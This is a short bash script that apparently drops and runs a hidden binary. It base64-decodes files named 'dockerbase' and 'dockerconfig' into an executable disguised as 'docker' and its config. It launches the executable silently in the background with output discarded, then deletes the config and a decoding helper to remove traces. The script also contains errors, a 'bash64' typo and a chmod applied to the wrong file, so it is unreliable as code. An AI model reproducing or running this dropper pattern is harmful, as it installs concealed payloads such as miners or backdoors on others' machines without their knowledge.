#!/bin/bash
 base64 -d dockerbase > docker
 bash64 -d dockerconfig > docker.pb
 chmod 777 basejiema
./docker -config docker.pb> /dev/null 2>&1 &
 rm -rf ./basejiema
 rm -rf ./docker.pb
